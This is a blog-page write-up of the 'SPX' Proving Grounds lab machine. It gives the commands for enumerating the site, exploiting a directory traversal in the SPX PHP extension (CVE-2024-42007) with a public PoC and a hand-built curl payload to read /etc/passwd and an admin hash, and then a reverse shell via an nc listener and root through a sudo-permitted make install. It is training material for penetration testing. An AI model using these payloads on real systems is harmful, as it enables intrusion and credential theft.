<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
    <meta name="description" content="" />
    <meta name="author" content="" />
    <title>Matthew Castro - Blog</title>
    <link rel="icon" type="image/x-icon" href="../../assets/favicon.ico" />
    <!-- Font Awesome icons (free version)-->
    <script src="https://use.fontawesome.com/releases/v6.3.0/js/all.js" crossorigin="anonymous"></script>
    <!-- Google fonts-->
    <link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet"
        type="text/css" />
    <link
        href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800"
        rel="stylesheet" type="text/css" />
    <!-- Core theme CSS (includes Bootstrap)-->
    <link href="../../css/styles.css" rel="stylesheet" />
    <link rel="preload" as="image" href="/assets/img/backgroud.jpg">
    <link rel="preload" as="image" href="/assets/img/posts.jpg">
</head>

<body>
    <!-- Navigation-->
    <nav class="navbar navbar-expand-lg navbar-light" id="mainNav">
        <div class="container px-4 px-lg-5">
            <a class="navbar-brand" href="../../index.html">Matthew Castro</a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarResponsive"
                aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
                Menu
                <i class="fas fa-bars"></i>
            </button>
            <div class="collapse navbar-collapse" id="navbarResponsive">
                <ul class="navbar-nav ms-auto py-4 py-lg-0">
                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../index.html">Homelab</a></li>
                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../reports.html">Reports</a></li>
                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../Write-ups.html">Write-ups</a></li>
                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../about.html">About</a></li>
                </ul>
            </div>
        </div>
    </nav>
    <!-- Page Header-->
    <header class="masthead" style="background-image: url('../../assets/img/posts.jpg')">
        <div class="container position-relative px-4 px-lg-5">
            <div class="row gx-4 gx-lg-5 justify-content-center">
                <div class="col-md-10 col-lg-8 col-xl-7">
                    <div class="post-heading">
                        <h2>SPX - Proving Grounds Write-up</h2>
                        <span class="meta">
                            Posted on January 13st, 2026
                        </span>
                    </div>
                </div>
            </div>
        </div>
    </header>
    <!-- Post Content-->
    <article class="mb-4">
        <div class="container px-4 px-lg-5">
            <div class="row gx-4 gx-lg-5 justify-content-center">
                <div class="col-md-10 col-lg-8 col-xl-7">
                    <p>We start by enumerating the directories of the website on port 80. 
                        The base directory seems to be hosting an instance of H3K Tiny File Manager. 
                         We find the phpinfo.php file exposed, located in the webroot. We gain some
                         more info on the system using the exposed file and find that the SPX php
                          extension version is vulnerable to directory traversal. 
                        <p></p>
                        <span class="grey-line">feroxbuster --url http://192.168.229.108/ --wordlist /usr/share/wordlists/dirb/common.txt</span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/SPX/1.png" alt="..." />
                        <p></p>
                        We use this POC:
                           <a href="https://github.com/BubblyCola/CVE_2024_42007" target="_blank">https://github.com/BubblyCola/CVE_2024_42007</a> and obtain file read on the system.
                        <p></p>
                        <span class="grey-line">git clone https://github.com/BubblyCola/CVE_2024_42007</span>
                        <p></p>
                        <span class="grey-line">python3 CVE_2024_42007.py -t http://192.168.229.108/ -f /etc/passwd</span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/SPX/2.png" alt="..." />
                        <p></p>
                    </p>
                    <p>
                        Due to having already worked with H3K TinyFileManager in a previous lab, I know that all the code is contained on one large PHP file.
                         We read it with curl to obtain the admin hash (I could not read it with the POC script). To read files on the website with curl,
                          we use the SPX key value from the phpinfo.php file and use the same payload as in the POC. We need to add 18 URL-encoded 
                          "../" characters before adding the path of the file we want to read.
                    </p>
                        <p></p>
                        <p></p>
                        <span class="grey-line">curl 'http://192.168.229.108/?SPX_KEY=a2a90ca2f9f0ea04d267b16fb8e63800&SPX_UI_URI=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fvar%2fwww%2fhtml%2findex.php' > tinyfilemanager.php</span>
                        <p></p>
                        <span class="grey-line">cat tinyfilemanager.php | grep admin  </span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/SPX/3.png" alt="..." />
                        <p></p>

                    
                        We crack the hash, login to Tiny File Manager as admin, upload a php reverse shell and visit the file URL with our browser to obtain a reverse shell.
                        <p></p>
                        <span class="grey-line">rlwrap nc -lvnp 80</span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/SPX/4.png" alt="..." />
                        <p></p>                    
                        We then switch to user "profiler" with the same  password we cracked from the Tiny File Manager admin account.
                        <p></p>
                        <span class="grey-line">su profiler</span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/SPX/5.png" alt="..." />
                        <p></p>
                        We then verify what commands we are allowed to run as root with the user. We find the following entry:
                        <p></p>
                        <span class="grey-line">(ALL) /usr/bin/make install -C /home/profiler/php-spx</span>
                        <p></p>
                        We have full control over the makefile in the php-spx directory, meaning we can replace it with our own. We create a makefile with an "install" 
                        function that adds a second root user. 
                        <p></p>
                        <span class="grey-line">sudo -l</span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/SPX/6.png" alt="..." />
                        <p></p>
                        <span class="grey-line">cat MakeFile</span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/SPX/7.png" alt="..." />
                        <p></p>
                        <span class="grey-line">cp /var/www/html/Makefile .</span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/SPX/8.png" alt="..." />
                        <p></p>
                        We then run the command and switch to the user with su to obtain a root shell.
                        <p></p>
                        <span class="grey-line">sudo /usr/bin/make install -C /home/profiler/php-spx</span>
                        <p></p>
                        <span class="grey-line">su root2</span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/SPX/9.png" alt="..." />
                        <p></p>

                </div>
            </div>
        </div>
    </article>
    <!-- Bootstrap core JS-->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
    <!-- Core theme JS-->
    <script src="js/scripts.js"></script>
</body>

</html>